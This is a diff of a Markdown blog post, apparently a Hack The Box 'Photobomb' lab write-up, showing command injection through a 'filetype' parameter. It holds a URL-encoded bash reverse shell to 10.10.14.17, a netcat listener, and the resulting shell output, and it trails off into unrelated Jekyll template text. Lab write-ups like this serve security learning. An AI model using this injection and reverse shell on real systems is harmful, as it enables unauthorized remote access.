@@ -87,21 +87,37 @@ Send it to repeater tool we are going to change any variable from `filetype` par
 
 ![HTB Img](/assets/img//HTB/EASY/repeater.png)
 
-verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on this parameter we are put to next to `jpg` adding `;` and write the next reverse shell code *(PD: encoded on url because we'll have an error from the syntaxis due for the commas)* on my case I'll use from *bash* method with **Netcat** listener
+### Exploit
+
+Verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on this parameter we are put to next to `jpg` adding `;` and write the next reverse shell code *(PD: encoded on url because we'll have an error from the syntaxis due for the commas)* on my case I'll use from *bash* method with **Netcat** listener
 
 ```console
 $ bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
 ```
-> You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) fi you want :D.
+> You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) if you want :D.
 {: .prompt-tip }
 
-Now we are lsitening from our terminal with netcat see any response
+Now we are listening from our terminal with netcat see any response
 
 ```console
 $ nc -lvnp 4040
 
-Listening on [any] 0.0.0.0 4040 ...
+Listening on [any] 4040 ...
+---
+$ wizard@photobomb:~/photobomb$ whoami
+$ whoami
+$ wizard
 ```
+Now we are verify if we aren't on a virtual container:
+
+```console
+$ wizard@photobomb:~/photobomb$ hostname -I
+$ hostname -I
+$ 10.10.11.182 dead:beef::250:56ff:feb9:d10e
+$ wizard@photobomb:~/photobomb$
+```
+
+
 
 Create a new file named `YYYY-MM-DD-TITLE.EXTENSION`{: .filepath} and put it in the `_posts`{: .filepath} of the root directory. Please note that the `EXTENSION`{: .filepath} must be one of `md`{: .filepath} and `markdown`{: .filepath}. If you want to save time of creating files, please consider using the plugin `Jekyll-Compose`(https://github.com/jekyll/jekyll-compose) to accomplish this.
 
